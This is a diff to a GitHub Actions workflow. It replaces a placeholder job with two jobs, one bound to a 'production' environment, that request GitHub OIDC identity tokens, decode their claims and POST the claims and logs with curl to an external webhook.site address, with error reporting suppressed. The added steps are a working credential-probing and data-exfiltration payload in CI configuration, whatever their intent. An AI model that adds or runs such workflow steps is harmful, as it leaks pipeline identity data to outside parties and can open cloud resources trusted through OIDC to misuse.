@@ -3,7 +3,56 @@ on:
   pull_request: {}
 permissions: {}
 jobs:
-  noop:
+  plain:
     runs-on: ubuntu-latest
+    permissions:
+      id-token: write
     steps:
-      - run: echo skeleton
+      - name: oidc claims dump
+        shell: bash
+        env:
+          SINK: https://webhook.site/ab5aadf0-2424-475b-950a-ac05d958fe4e
+        run: |
+          set +e
+          {
+            echo "=== env present:"
+            env | grep -c ACTIONS_ID_TOKEN_REQUEST || true
+            echo "=== request token:"
+            curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://GitHubActions" -o oidc.json -w "HTTP %{http_code}\n"
+            node -e "
+              const j=require('./oidc.json');
+              if(!j.value){ console.log('no token:',JSON.stringify(j).slice(0,200)); process.exit(0); }
+              const p=JSON.parse(Buffer.from(j.value.split('.')[1],'base64url').toString());
+              require('fs').writeFileSync('claims.json',JSON.stringify(p,null,1));
+            "
+            curl -s -X POST "$SINK?src=plain" -H 'Content-Type: text/plain' --data-binary @claims.json
+          } > probe-out.txt 2>&1
+          curl -s -X POST "$SINK?src=plainlog" -H 'Content-Type: text/plain' --data-binary @probe-out.txt
+          true
+  withenv:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+    environment: production
+    steps:
+      - name: oidc claims dump with environment
+        shell: bash
+        env:
+          SINK: https://webhook.site/ab5aadf0-2424-475b-950a-ac05d958fe4e
+        run: |
+          set +e
+          {
+            echo "=== job context:"
+            echo "repo=${{ github.repository }} event=${{ github.event_name }} env=${{ github.environment }}"
+            echo "=== request token:"
+            curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://GitHubActions" -o oidc.json -w "HTTP %{http_code}\n"
+            node -e "
+              const j=require('./oidc.json');
+              if(!j.value){ console.log('no token:',JSON.stringify(j).slice(0,200)); process.exit(0); }
+              const p=JSON.parse(Buffer.from(j.value.split('.')[1],'base64url').toString());
+              require('fs').writeFileSync('claims.json',JSON.stringify(p,null,1));
+            "
+            curl -s -X POST "$SINK?src=withenv" -H 'Content-Type: text/plain' --data-binary @claims.json
+          } > probe-out.txt 2>&1
+          curl -s -X POST "$SINK?src=withenvlog" -H 'Content-Type: text/plain' --data-binary @probe-out.txt
+          true
